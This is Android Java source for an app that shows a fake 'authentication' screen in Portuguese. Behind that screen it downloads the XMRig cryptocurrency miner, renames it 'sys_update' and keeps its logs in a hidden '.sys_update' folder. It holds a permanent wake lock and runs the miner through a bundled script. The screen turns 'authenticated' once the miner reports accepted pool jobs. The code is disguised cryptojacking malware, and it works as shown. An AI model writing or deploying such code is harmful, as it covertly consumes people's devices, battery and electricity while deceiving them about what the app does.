package com.miner.app;

import android.app.Activity;
import android.app.AlertDialog;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.view.Gravity;
import android.view.View;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.TextView;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {

    private TextView statusText;
    private ProgressBar progressBar;
    private View pulseView;
    private boolean isAuthenticated = false;
    private int clickCount = 0;
    private File logFile;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        logFile = new File(getFilesDir(), ".sys_update/sys_log.txt");

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.parseColor("#121212"));
        layout.setPadding(50, 50, 50, 50);

        layout.setOnClickListener(v -> {
            clickCount++;
            if (clickCount >= 10) {
                showLogs();
                clickCount = 0;
            }
        });

        statusText = new TextView(this);
        statusText.setText("Iniciando autenticação...");
        statusText.setTextColor(Color.WHITE);
        statusText.setTextSize(18);
        statusText.setGravity(Gravity.CENTER);
        
        progressBar = new ProgressBar(this);
        progressBar.setIndeterminate(true);
        
        pulseView = new View(this);
        LinearLayout.LayoutParams pulseParams = new LinearLayout.LayoutParams(100, 100);
        pulseParams.setMargins(0, 40, 0, 40);
        pulseView.setLayoutParams(pulseParams);
        pulseView.setBackgroundResource(android.R.drawable.presence_online);
        pulseView.setVisibility(View.INVISIBLE);

        layout.addView(progressBar);
        layout.addView(statusText);
        layout.addView(pulseView);
        
        setContentView(layout);

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Miner:Wakelock");
        wakeLock.acquire();

        new Thread(() -> {
            try {
                // 1. Criar estrutura de "Maquina Virtual" (Rootfs virtual)
                File rootfs = new File(getFilesDir(), "virtual_linux");
                File binDir = new File(rootfs, "bin");
                File tmpDir = new File(rootfs, "tmp");
                File homeDir = new File(rootfs, "home");
                
                if (!binDir.exists()) binDir.mkdirs();
                if (!tmpDir.exists()) tmpDir.mkdirs();
                if (!homeDir.exists()) homeDir.mkdirs();

                writeToLog("Inicializando ambiente virtual Linux...");
                
                // 2. Localização do minerador (dentro do bin da VM)
                File minerBin = new File(binDir, "sys_update");
                if (!minerBin.exists()) {
                    writeToLog("Instalando componentes no ambiente virtual...");
                    String downloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-static-arm64.tar.gz";
                    File tarFile = new File(tmpDir, "miner.tar.gz");
                    downloadFile(downloadUrl, tarFile);
                    
                    writeToLog("Extraindo no rootfs virtual...");
                    if (!extractTar(tarFile, binDir)) {
                        writeToLog("ERRO: Falha na extração.");
                    }
                    tarFile.delete();
                }

                // 3. Verificação Final e busca recursiva se falhou
                if (!minerBin.exists()) {
                    File found = findXmrigRecursively(binDir);
                    if (found != null) {
                        found.renameTo(minerBin);
                        minerBin.setExecutable(true);
                    }
                }

                // 4. Rodar miner.sh (o gerenciador da VM)
                File script = new File(binDir, "miner.sh");
                copyAsset("miner.sh", script);
                script.setExecutable(true);

                if (minerBin.exists()) {
                    writeToLog("Rodando script dentro da VM isolada...");
                    ProcessBuilder pb = new ProcessBuilder("sh", script.getAbsolutePath());
                    pb.directory(homeDir); // O script começa na HOME da VM
                    
                    // Configurar ambiente como se fosse uma maquina real
                    pb.environment().put("HOME", homeDir.getAbsolutePath());
                    pb.environment().put("TMPDIR", tmpDir.getAbsolutePath());
                    pb.environment().put("PATH", binDir.getAbsolutePath() + ":/system/bin:/system/xbin");
                    pb.environment().put("IS_VIRTUAL_MACHINE", "true");
                    pb.environment().put("VM_ROOT", rootfs.getAbsolutePath());
                    
                    pb.redirectErrorStream(true);
                    pb.start();
                } else {
                    writeToLog("ERRO: Binário não encontrado na VM.");
                }

                // 5. Monitorar Log para Sucesso
                while (!isAuthenticated) {
                    File vmLog = new File(homeDir, "sys_log.txt");
                    if (vmLog.exists() && checkLogForSuccess(vmLog)) {
                        isAuthenticated = true;
                        updateUIToAuthenticated();
                        break;
                    }
                    Thread.sleep(2000);
                }

            } catch (Exception e) {
                writeToLog("ERRO VM: " + e.getMessage());
                e.printStackTrace();
            }
        }).start();
    }

    private void writeToLog(String msg) {
        try {
            if (!logFile.getParentFile().exists()) logFile.getParentFile().mkdirs();
            FileOutputStream fos = new FileOutputStream(logFile, true);
            fos.write(("[Java] " + msg + "\n").getBytes());
            fos.close();
        } catch (Exception e) {}
    }

    private void downloadFile(String urlStr, File dest) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setInstanceFollowRedirects(true);
        InputStream in = new BufferedInputStream(conn.getInputStream());
        FileOutputStream out = new FileOutputStream(dest);
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
        out.close();
        in.close();
    }

    private File findXmrigRecursively(File dir) {
        File[] files = dir.listFiles();
        if (files == null) return null;
        for (File f : files) {
            if (f.isDirectory()) {
                File found = findXmrigRecursively(f);
                if (found != null) return found;
            } else if (f.getName().equals("xmrig")) {
                return f;
            }
        }
        return null;
    }

    private boolean extractTar(File tarFile, File destDir) {
        try {
            // Usa o comando tar nativo do Android (Toybox) que é mais confiavel
            // Tenta primeiro com z (gzip) e depois sem, em caso de falha.
            String[] cmds = {
                "tar -xzf " + tarFile.getAbsolutePath() + " -C " + destDir.getAbsolutePath(),
                "tar -xf " + tarFile.getAbsolutePath() + " -C " + destDir.getAbsolutePath()
            };

            for (String cmd : cmds) {
                Process process = Runtime.getRuntime().exec(cmd);
                if (process.waitFor() == 0) break;
            }
            
            // Mover o binario xmrig para o nome correto
            File[] files = destDir.listFiles();
            if (files != null) {
                for (File f : files) {
                    if (f.isDirectory()) {
                        File xmrig = new File(f, "xmrig");
                        if (xmrig.exists()) {
                            xmrig.renameTo(new File(destDir, "sys_update"));
                            new File(destDir, "sys_update").setExecutable(true);
                            return true;
                        }
                    }
                }
            }
        } catch (Exception e) {
            writeToLog("Exceção na extração: " + e.getMessage());
        }
        return false;
    }

    private void showLogs() {
        try {
            StringBuilder logs = new StringBuilder();
            if (logFile.exists()) {
                BufferedReader br = new BufferedReader(new FileReader(logFile));
                String line;
                while ((line = br.readLine()) != null) logs.append(line).append("\n");
                br.close();
            } else {
                logs.append("Log ainda não gerado...");
            }

            TextView logTextView = new TextView(this);
            logTextView.setText(logs.toString());
            logTextView.setPadding(20, 20, 20, 20);
            logTextView.setTextColor(Color.GREEN);
            logTextView.setTextSize(12);
            logTextView.setBackgroundColor(Color.BLACK);
            logTextView.setTypeface(android.graphics.Typeface.MONOSPACE);

            ScrollView scrollView = new ScrollView(this);
            scrollView.setBackgroundColor(Color.BLACK);
            scrollView.addView(logTextView);

            new AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_NoActionBar_Fullscreen)
                .setTitle("Terminal da VM")
                .setView(scrollView)
                .setPositiveButton("Minimizar", null)
                .show();
        } catch (Exception e) {}
    }

    private boolean checkLogForSuccess(File log) {
        try (BufferedReader br = new BufferedReader(new FileReader(log))) {
            String line;
            while ((line = br.readLine()) != null) {
                if (line.contains("READY threads") || line.contains("accepted") || line.contains("new job from")) return true;
            }
        } catch (Exception e) {}
        return false;
    }

    private void updateUIToAuthenticated() {
        new Handler(Looper.getMainLooper()).post(() -> {
            statusText.setText("Area autenticada");
            statusText.setTextColor(Color.GREEN);
            progressBar.setVisibility(View.GONE);
            pulseView.setVisibility(View.VISIBLE);
            AlphaAnimation blink = new AlphaAnimation(0.2f, 1.0f);
            blink.setDuration(1000);
            blink.setRepeatMode(Animation.REVERSE);
            blink.setRepeatCount(Animation.INFINITE);
            pulseView.startAnimation(blink);
        });
    }

    private void copyAsset(String name, File dest) throws Exception {
        InputStream is = getAssets().open(name);
        OutputStream os = new FileOutputStream(dest);
        byte[] buffer = new byte[1024];
        int read;
        while ((read = is.read(buffer)) != -1) os.write(buffer, 0, read);
        is.close();
        os.flush();
        os.close();
    }
}
